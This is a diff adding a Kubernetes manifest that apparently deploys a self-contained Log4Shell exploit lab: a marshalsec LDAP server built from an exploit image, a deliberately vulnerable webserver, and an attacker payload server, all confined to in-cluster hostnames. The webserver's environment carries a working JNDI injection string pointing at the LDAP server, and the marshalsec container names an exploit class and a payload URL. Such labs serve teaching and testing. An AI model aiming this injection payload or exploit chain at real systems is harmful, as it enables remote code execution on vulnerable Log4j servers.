@@ -1,0 +1,182 @@
+##########################
+# Create Namespace
+##########################
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: log4j
+  labels:
+    app: log4j
+    env: dev
+---
+##########################
+# Deploy Marshalsec Service
+##########################
+apiVersion: v1
+kind: Service
+metadata:
+  labels:
+    app: log4j
+    env: dev
+  name: log4j-ldap
+  namespace: log4j
+spec:
+  ports:
+    - name: "marshalsec-ldap"
+      port: 1389
+      targetPort: 1389
+  selector:
+    io.kompose.service: log4j-ldap
+status:
+  loadBalancer: {}
+---
+##########################
+# Deploy Marshalsec Container
+##########################
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: marshalsec-server
+  namespace: log4j
+  labels:
+    io.kompose.service: log4j-ldap
+    app: log4j
+spec:
+  selector:
+    matchLabels:
+      io.kompose.service: log4j-ldap
+  replicas: 1
+  revisionHistoryLimit: 10
+  template:
+    metadata:
+      labels:
+        io.kompose.service: log4j-ldap
+        app: log4j
+        env: dev
+      namespace: log4j
+    spec:
+      containers:
+      - name: marshalsec-server
+        image: ankurkatiyar/log4jexploit:latest
+        env:
+        - name: ENV_PAYLOAD
+          value: 'http://log4j-attackserver.log4j.svc.cluster.local:8080/'
+        - name: ENV_EXPLOIT_CLASS
+          value: 'Log4jpoc'
+
+        ports:
+          - name: marshalsec-ldap
+            containerPort: 1389
+            protocol: TCP
+---
+##########################
+# Deploy Vunerable WebServer Service
+##########################
+apiVersion: v1
+kind: Service
+metadata:
+  labels:
+    app: log4j
+    env: dev
+  name: log4j-webserver
+  namespace: log4j
+spec:
+  ports:
+    - name: "webserver"
+      port: 8080
+      targetPort: 8080
+  selector:
+    io.kompose.service: log4j-webserver
+status:
+  loadBalancer: {}
+---
+##########################
+# Deploy WebServer Container
+##########################
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: log4j-webserver
+  namespace: log4j
+  labels:
+    io.kompose.service: log4j-webserver
+    app: log4j
+spec:
+  selector:
+    matchLabels:
+      io.kompose.service: log4j-webserver
+  replicas: 1
+  revisionHistoryLimit: 10
+  template:
+    metadata:
+      labels:
+        io.kompose.service: log4j-webserver
+        app: log4j
+        env: dev
+      namespace: log4j
+    spec:
+      containers:
+      - name: log4j-webserver
+        image: ankurkatiyar/log4j-vunerable-server:latest
+        env:
+        - name: jndiUrl
+          value: '${jndi:ldap://log4j-ldap.log4j.svc.cluster.local:1389/Log4jpoc}'
+
+        ports:
+          - name: webserver
+            containerPort: 8080
+            protocol: TCP
+---
+##########################
+# Deploy Attacker Service
+##########################
+apiVersion: v1
+kind: Service
+metadata:
+  labels:
+    app: log4j
+    env: dev
+  name: log4j-attackserver
+  namespace: log4j
+spec:
+  ports:
+    - name: "attackserver"
+      port: 8080
+      targetPort: 8080
+  selector:
+    io.kompose.service: log4j-attackserver
+status:
+  loadBalancer: {}
+---
+##########################
+# Deploy AttackServer Container
+##########################
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: log4j-attackserver
+  namespace: log4j
+  labels:
+    io.kompose.service: log4j-attackserver
+    app: log4j
+spec:
+  selector:
+    matchLabels:
+      io.kompose.service: log4j-attackserver
+  replicas: 1
+  revisionHistoryLimit: 10
+  template:
+    metadata:
+      labels:
+        io.kompose.service: log4j-attackserver
+        app: log4j
+        env: dev
+      namespace: log4j
+    spec:
+      containers:
+      - name: log4j-attackserver
+        image: ankurkatiyar/log4j-attack-server:latest
+        ports:
+          - name: attackserver
+            containerPort: 8080
+            protocol: TCP
